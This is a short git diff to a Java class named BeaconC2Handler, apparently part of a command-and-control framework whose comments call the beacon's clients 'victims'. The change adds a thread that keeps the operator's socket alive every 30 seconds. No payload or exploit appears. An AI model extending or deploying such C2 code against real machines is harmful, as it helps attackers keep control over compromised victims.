@@ -6,6 +6,7 @@ import java.util.ArrayList;
 import java.util.HashMap;
 
 import Servers.Duplexer;
+import Servers.keepAlive;
 
 public class BeaconC2Handler implements Runnable{
     // Pointer to the Long Range Beacon Server that interacts with the clients (victims)
@@ -16,6 +17,10 @@ public class BeaconC2Handler implements Runnable{
 
     // Hashed Password for Authentication to the C2 Server
     private String passwordDigest;
+
+    // Class and Thread that send a KEEP_ALIVE Messsage to the C2 Server every 30 seconds to keep the socket open
+    private keepAlive keepAliveClass;
+    private Thread keepAliveThread;
 
     /**
      * This starts a thread that sends and receives messages with the C2 Server
@@ -32,6 +37,8 @@ public class BeaconC2Handler implements Runnable{
         Socket socket = new Socket(C2ServerIPAddress, 1234);
         this.C2Server = new Duplexer(socket);
         this.passwordDigest = passwordDigest;
+        this.keepAliveClass = new keepAlive(C2Server, false, false);
+        this.keepAliveThread = new Thread(keepAliveClass);
     }
 
     /**
@@ -87,6 +94,8 @@ public class BeaconC2Handler implements Runnable{
                 beaconServer.quit(reason);
                 C2Server.close();
                 authenticationSentinel = false;
+            } else {
+                keepAliveThread.start();
             }
         }catch(IOException e){
             e.printStackTrace();
@@ -181,10 +190,9 @@ public class BeaconC2Handler implements Runnable{
                     responseToRequest = beaconServer.getClientStatus();
                     C2Server.send(responseToRequest);
                 }
-                
-                
             } catch(IOException e){
                 e.printStackTrace();
+                keepAliveClass.stopKeepAlive();
             }
         }
     }
